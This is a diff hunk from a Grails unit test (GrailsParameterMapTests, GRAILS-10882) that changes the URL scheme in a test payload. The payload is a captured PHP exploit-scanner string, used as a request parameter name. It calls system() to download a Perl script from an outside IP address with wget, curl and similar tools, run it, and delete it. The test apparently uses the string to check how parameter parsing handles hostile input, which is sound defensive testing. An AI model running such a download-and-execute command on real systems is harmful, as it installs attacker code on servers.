@@ -496,7 +496,7 @@ class GrailsParameterMapTests {
     // GRAILS-10882
     void testGRAILS10882() {
         def request = new MockHttpServletRequest('POST', '/cgi-bin/php.cgi')
-        def phpExploitScannerBody = '<?php system("cd /var/tmp;rm -rf mc.pl*;wget http://164.177.157.215/drupal/themes/bartik/images/log/-log/mc.pl;perl mc.pl;rm -rf mc.pl;curl -O http://164.177.157.215/drupal/themes/bartik/images/log/-log/mc.pl;perl mc.pl;rm -rf mc.pl;fetch http://164.177.157.215/drupal/themes/bartik/images/log/-log/mc.pl;perl mc.pl;rm -rf mc.pl;lwp-get http://164.177.157.215/drupal/themes/bartik/images/log/-log/mc.pl;perl mc.pl;rm -rf mc.pl;cd /dev/shm;rm -rf mc.pl*;wget http://164.177.157.215/drupal/themes/bartik/images/log/-log/'
+        def phpExploitScannerBody = '<?php system("cd /var/tmp;rm -rf mc.pl*;wget https://164.177.157.215/drupal/themes/bartik/images/log/-log/mc.pl;perl mc.pl;rm -rf mc.pl;curl -O https://164.177.157.215/drupal/themes/bartik/images/log/-log/mc.pl;perl mc.pl;rm -rf mc.pl;fetch https://164.177.157.215/drupal/themes/bartik/images/log/-log/mc.pl;perl mc.pl;rm -rf mc.pl;lwp-get https://164.177.157.215/drupal/themes/bartik/images/log/-log/mc.pl;perl mc.pl;rm -rf mc.pl;cd /dev/shm;rm -rf mc.pl*;wget https://164.177.157.215/drupal/themes/bartik/images/log/-log/'
         request.setParameter(phpExploitScannerBody, '')
         long startTime = System.currentTimeMillis()
         def params = new GrailsParameterMap(request)
